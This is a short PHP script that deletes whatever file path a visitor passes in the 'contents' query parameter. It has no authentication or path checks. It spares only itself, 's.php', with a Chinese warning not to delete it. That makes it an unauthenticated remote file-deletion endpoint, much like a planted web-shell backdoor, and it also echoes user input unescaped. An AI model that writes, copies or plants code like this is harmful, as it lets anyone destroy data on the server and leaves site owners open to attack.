<?php

$file = $_GET['contents'];

if($file!='s.php')
{
  if (!unlink($file))

  {

  echo ("Error deleting $file");

  }

else

  {

  echo ("Deleted $file");

  }

}else{
  echo ("请勿删除此文件！！！");
}

?>